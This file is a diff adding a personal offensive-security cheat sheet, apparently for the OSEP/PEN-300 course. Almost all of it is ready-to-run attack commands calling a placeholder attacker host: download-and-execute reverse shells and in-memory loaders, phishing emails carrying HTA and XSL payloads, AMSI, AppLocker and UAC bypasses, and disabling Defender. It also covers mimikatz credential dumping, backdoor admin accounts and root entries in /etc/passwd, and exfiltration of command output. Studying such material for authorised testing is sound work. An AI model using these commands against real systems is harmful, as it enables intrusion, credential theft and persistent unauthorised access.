@@ -1,0 +1,267 @@
+% OSEP cheats
+$ ip: ip a s tun0 | grep 'inet ' | awk '{print $2}' | sed 's/\/.*//g'
+$ port: echo '80'
+$ file: echo 'exec-revshell.exe'
+$ target: echo 'target.com'
+
+# enumeration
+# Show LAPS information
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/LAPSToolkit.ps1') | IEX ; Get-LAPSComputers ; Find-LAPSDelegatedGroups ; Find-AdmPwdExtendedRights
+
+# Show the effective Applocker rules
+get-applockerpolicy -effective ; get-applockerpolicy -effective | select -ExpandProperty RuleCollections ;get-applockerpolicy -effective -xml\n\nCopy to VSCode and format
+
+# Show status of AV
+Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,IsTamperProtected,AntivirusSignatureLastUpdated
+
+# Linux process monitoring
+curl http://<ip>:<port>/ps/pspy64 -o ./pspy64 ; chmod +x ./pspy64 ; ./pspy64
+
+# Show the whitelisted paths for AV
+reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware\Exclusions\Paths"
+
+# Test AMSI, is it on?
+'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
+
+# Show the PowerShell language mode
+$ExecutionContext.SessionState.LanguageMode
+
+# Scan scope.txt
+mkdir nmap ; sudo nmap -v -Pn -sT -sV -O -sC -p- -iL scope.txt -oA nmap/all-port-service-os-script
+
+# Am I in CMD or PS?
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
+# payload
+# Download and execute a PowerShell payload
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/pl/isma1.txt') | IEX ; (New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/pl/run.txt') | IEX
+
+# Download and execute .EXE revshell in-memory
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/Invoke-ReflectivePEInjection.ps1') | IEX ; Invoke-ReflectivePEInjection -PEBytes (New-Object System.Net.WebClient).DownloadData('http://<ip>:<port>/pl/exec-revshell.exe') -ProcId (Get-Process -Name explorer).Id
+
+# Download and execute .DLL revshell in-memory
+$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>:<port>/pl/dll-revshell.dll') ; $assem = [System.Reflection.Assembly]::Load($data) ; $class = $assem.GetType('dll_revshell.Class1') ; $method = $class.GetMethod('runner') ; $method.Invoke(0, $null)
+
+# Download and inject .EXE revshell in-memory
+$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>:<port>/pl/<file>') ; $assem = [System.Reflection.Assembly]::Load($data) ; [{args.file.replace('.exe', '')}.Program]::Main("COMMAND-HERE".Split())
+
+# Generate demon.js used for HTA and XSL
+.\DotNetToJScript.exe Z:\source\dll-revshell\bin\x64\Release\dll-revshell.dll --lang=Jscript --ver=v4 -o Z:\DotNetToJscript\demon.js
+
+# Download and run a revshell using MSHTA (CLM bypass)
+cmd.exe /c mshta.exe http://<ip>:<port>/pl/js-revshell.hta
+
+# Download and run a revshell using XSL (CLM bypass)
+cmd.exe /c wmic process get brief /format:"http://<ip>:<port>/pl/js-revshell.xsl"
+
+# Execute a .DLL
+rundll32 C:\Tools\met.dll,run
+
+# Download and drop a revshell (.ELF)
+curl http://<ip>:<port>/pl/li-rshell.elf -o ./li-rshell.elf
+
+# Download  and execute an ELF in-memory
+fee rshell > /home/tijmen/pen300/www/pl/demon.py \ncurl http://<ip>:<port>/pl/demon.py | python
+
+# Download and drop a revshell (.SO) for LD_LIBRARY_PATH vulns
+curl http://<ip>:<port>/pl/li-rshell.so -o ./li-rshell.so
+
+# Download and drop a revshell (.SO) for LD_PRELOAD vulns
+curl http://<ip>:<port>/pl/evil_<file> -o ./evil_<file>
+
+# Send a .HTA payload over E-mail
+swaks --to REPLACE@ME.com --from yeri@foobar.com --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.hta"
+
+# Send a .XSL payload over E-mail
+swaks --to REPLACE@ME.com --from yeri@foobar.com --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.xsl"
+
+# bypass
+# Disable MS Defender (admin needed)
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/Disable-AV.ps1') | IEX
+
+# Bypasses CLM and AppLocker using the uninstall-method
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /interactive=true /U .\uninstall-bypass.exe
+
+# Bypass AMSI
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/pl/isma1.txt') | IEX
+
+# Set the PowerShell language mode
+$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'
+
+# Bypass AWL using HTA
+mshta.exe bypass.hta\n\n<html>\n<head>\n<script language="JScript">\n    var shell = new ActiveXObject("WScript.Shell");\n    var res = shell.Run("<file>");\n</script>\n</head>\n<body>\n<script language="JScript">\nself.close();\n</script>\n</body>\n</html>
+
+# Bypass AWL using XSL
+Run on Kali:\nvim /www/pl/bypass.xsl\n\nwmic process get brief /format:"http://<ip>:<port>/pl/bypass.xsl"
+
+# Bypass AWL using C# compilation (doesnt work?)
+$pathvar = ".\bypass.txt" ; $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe" ; $workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe) ; $SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static') ; Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll' ; $compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters ; $compilerparam.GenerateInMemory = $True ; $output = ".\bypass.xml" ; del $output ; $tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar))) ; Move-Item $tmp $output ; C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe .\bypass.xml .\out.log\n\n$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("USERREPLACE","FullControl","none","none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl\n\nusing System;\nusing System.Diagnostics;\nusing System.Workflow.ComponentModel;\npublic class Run : Activity{\n    public Run() {\n        ProcessStartInfo startInfo = new ProcessStartInfo\n        {\n            FileName = @"C:\Windows\System32\cmd.exe",\n            Arguments = @"/k whoami",\n            RedirectStandardOutput = true,\n            UseShellExecute = false,\n            CreateNoWindow = true\n        };\n\n        using (Process process = new Process { StartInfo = startInfo })\n        {\n            process.Start();\n            process.WaitForExit();\n        }\n    }\n}
+
+# Bypass UAC using varias methods
+Invoke-Webrequest -Uri http://<ip>:<port>/pe/SharpBypassUAC.exe -Outfile .\SharpBypassUAC.exe ; .\SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ==
+
+# Bypass UAC using FOD-helper
+$cmd = "cmd /c start powershell.exe" ; New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force ; New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force ; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force ; Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden ; Start-Sleep 3 ; Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
+
+# Bypass UAC using EventViwer
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/Invoke-Eventviewer.ps1') | IEX; Invoke-EventViewer cmd.exe
+
+# privesc
+# Windows PrivEsc enumeration
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath .\powerup.txt
+
+# Windows PrivEsc enumeration
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/jaws.ps1') | IEX | Out-File -FilePath .\jaws.txt
+
+# Windows PrivEsc enumeration
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/winPEAS.ps1') | IEX | Out-File -FilePath .\winpeas.txt
+
+# Linux PrivEsc enumeration
+curl http://<ip>:<port>/ps/linpeas.sh | sh | tee ./linpeas.txt
+
+# Multi PrivEsc enumeration
+run multi/recon/local_exploit_suggester
+
+# PrivEsc through weak service permissions
+Invoke-ServiceAbuse -Name "VulnerableSvc" -Command "net localgroup Administrators DOMAIN\user /add" ; net.exe stop VulnerableSvc ; net.exe start VulnerableSvc
+
+# PrivEsc through unqouted service path
+Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'; net.exe stop VulnerableSvc ; net.exe start VulnerableSvc
+
+# lateral
+# MSSQL exploitation tool (.PS1)
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/PowerUpSQL.ps1') | IEX
+
+# MSSQL exploitation tool (.EXE)
+Invoke-Webrequest -Uri http://<ip>:<port>/pe/SQLRecon.exe -Outfile SQLRecon.exe
+
+# MSSQL exploitation tool (.EXE)
+Invoke-Webrequest -Uri http://<ip>:<port>/pe/sqlexec.exe -Outfile sqlexec.exe
+
+# Fileless PsExec
+.\latexec.exe <target> SensorService "ping.exe <ip>"
+
+# Execute single commands through RDP (PsExec-like)
+.\SharpRDP.exe computername=<target> command="ping <ip>" username=corp\admin password=lab
+
+# Keylogger for RDP-processes
+.\rdpthief.exe C:\Users\offsec\Music\RdpThief.dll
+
+# Show captured data, number can vary
+C:\Users\offsec\AppData\Local\Temp\1\data.bin
+
+# Scan a system for spoolss service
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/SpoolerScan.ps1') | IEX ; Invoke-Scan -ipaddress <target>
+
+# Download ligolo for Windows
+Invoke-WebRequest -Uri http://<ip>:<port>/pe/ligolo.exe -OutFile .\ligolo.exe; Invoke-WebRequest -Uri http://<ip>:<port>/pe/wintun.dll -OutFile .\wintun.dll\n.\ligolo.exe -connect <ip>:11601 -ignore-cert
+
+# Download ligolo for Linux
+curl http://<ip>:<port>/pe/ligolo.elf -o ./ligolo.elf; chmod +x ./ligolo.elf\n./ligolo.elf -connect <ip>:11601 -ignore-cert
+
+# Load Ligolo into memory for Windows
+Run on Kali:\ndonut -f 1 -o /home/tijmen/pen300/www/pe/ligolo.bin -a 2 -p "-connect <ip>:11601 -ignore-cert" -i /home/tijmen/pen300/www/pe/ligolo.exe ; sed -i 's/[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}\.[0-9]\{{1,3\}}:[0-9]\{{1,5\}}/<ip>:<port>/g' /www/ps/Ligolo-AppLockerBypass.ps1\n\nIEX(new-object system.net.webclient).downloadstring('http://<ip>:<port>/ps/Ligolo-AppLockerBypass.ps1')
+
+# Spawn a meterpreter without a double hop issue
+nxc smb <target> -u USERREPLACE -H HASHREPLACE -d DOMAINREPLACE -X "[run.txt here]"
+
+# Show the PowerShell history of a user
+C:\Users\[REPLACEME]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# RCE commands with PowerUpSQL
+Get-SQLServerLinkCrawl -Username USERREPLACE -Password PASSREPLACE -QueryTarget [REPLACE: "SQL27\SQLEXPRESS"] -Query "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c ping <ip>';"\n\nGet-SQLServerLinkCrawl -Username USERREPLACE -Password PASSREPLACE -QueryTarget [REPLACE: "SQL27\SQLEXPRESS"] -Query "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'ping <ip>'"
+
+# active directory
+# Manual domain enumeration
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/PowerView.ps1') | IEX
+
+# Automatic domain enumeration
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/SharpHound.ps1') | IEX ; Invoke-BloodHound -CollectionMethod All
+
+# Exploiting ms-DS-MachineAccountQuota
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/Powermad.ps1') | IEX
+
+# In-memory Keberos toolset
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/Invoke-Rubeus.ps1') | IEX ; Invoke-Rubeus
+
+# persistance
+# Add pubkey to authorized_keys
+mkdir ~/.ssh/ ; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIbI6f5vDmSzXBNY150yIf3rJG0fR9YNaHT+UIPNLxTF tijmen@NX-76884" >> ~/.ssh/authorized_keys
+
+# Enable RDP on the system
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /
+
+# Enable PtH RDP(admin needed)
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
+
+# Connect PtH RDP
+xfreerdp /u:administrator /pth:REPLACEME /v:<target> /size:1920x1080 /cert-ignore
+
+# Add Yeri as local admin
+net user yeri P@ssw0rd /add ; net localgroup administrators yeri /add ; net localgroup "remote desktop users" yeri /add
+
+# Add Yeri as local admin (P@ssw0rd)
+echo "yeri:LhIg9GYHAJboc:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# loot
+# Credential exploitation (.EXE)
+Invoke-Webrequest -Uri http://<ip>:<port>/pe/mimikatz.exe -Outfile mimikatz.exe
+
+# Credential exploitation (.PS1)
+(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/ps/Invoke-Mimikatz.ps1') | IEX ; Get-Help Invoke-Mimikatz
+
+# General MimiKatz commands
+Upload mimidrv.sys!\nprivilege::debug\n!+\n!processprotect /process:lsass.exe /remove\nsekurlsa::logonpasswords\nlsadump::lsa /patch\nlsadump::sam\nlsadump::dcsync /user:DOMAIN\krbtgt /domain:targetdomain.com\nvault::list\nvault::cred /patch
+
+# List of interesting Windows files
+tree /f /a C:\Users\nC:\inetpub\www\*\web.config\nC:\Windows\Panther\Unattend.xml\nC:\ProgramData\Configs\\nC:\Program Files\Windows PowerShell\\nC:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty\nC:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml\nC:\Program Files\Jenkins\credentials.xml\nC:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml\nGet-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password\n
+
+# metasploit
+# Startup and run
+Deprecated, use resources instead\nsudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; run -j"
+
+# Startup and run
+Deprecated, use resources instead\nsudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; run -j"
+
+# Startup and run with auto migrate
+Deprecated, use resources instead\nsudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; set AutoRunScript /home/tijmen/pen300/tools/migrate_explorer.rc; run -j"
+
+# Startup and run with auto migrate
+Deprecated, use resources instead\nsudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; set AutoRunScript /home/tijmen/pen300/tools/migrate_explorer.rc; run -j"
+
+# others
+# PowerShell prefixes
+powershell -nop -ep bypass -enc <COMMAND>\npowershell -nop -ep bypass -c <COMMAND>
+
+# Stomping MS-Word
+.\EvilClippy.exe -s fakecode.vba macrofile.doc
+
+# Extract command output via HTTP POST
+Invoke-WebRequest -Uri http://<ip>:<port>/extract -Method post -Body (whoami) -Timeoutsec 2
+
+# Download a file with base64 content using BITS, after run it using the uninstall-method
+bitsadmin /Transfer myJob http://<ip>:<port>/pe/<file> C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\<file> && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\student\<file>
+
+# Search for a string in Windows
+Get-ChildItem -Path C:\ -Include .config,.txt,.xml,.ini  -File -Recurse -ErrorAction SilentlyContinue | select-string -Pattern "REPLACEME"
+
+# Compile C-code using an old compiler
+docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -z execstack -o evil.elf elf-revshell.c
+
+# Improve a Linux shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+# Replacement for the watch command
+while true; do if [ "$(ls -A | wc -l)" -gt 0 ]; then break; else date; sleep 5; fi; done
+
+# PowerShell download through a Proxy
+Disable Proxy: $wc.proxy = $null\n\nNew-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null ; $keys = Get-ChildItem 'HKU:' ; ForEach ($key in $keys) {{if ($key.Name -like "*S-1-5-21-*") {{$start = $key.Name.substring(10);break}}}} ; $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer ; [system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr") ; $wc = new-object system.net.WebClient ; Write-Host '$wc.proxy = $null' ; $wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0") ; $wc.DownloadString("http://<ip>:<port>/run.txt") | IEX
+
+# Double hop can be fixed when you have the users password
+Spawn a meterpreter using NXC SMB or...\n$SecPassword = ConvertTo-SecureString 'PASSWDREPLACE' -AsPlainText -Force ; $Cred = New-Object System.Management.Automation.PSCredential('DOMAINREPLACE\USERREPLACE', $SecPassword); Get-DomainGroup -Identity "Domain Admins" -Credential $Cred -Domain DOMAINREPLACE -Verbose
+
+# Load a .DLL into memory
+Import-Module .\Microsoft.ActiveDirectory.Management.dll
+
+# General notes
+` escapes "\nInvoke-RestMethod (irm) can replace iwr
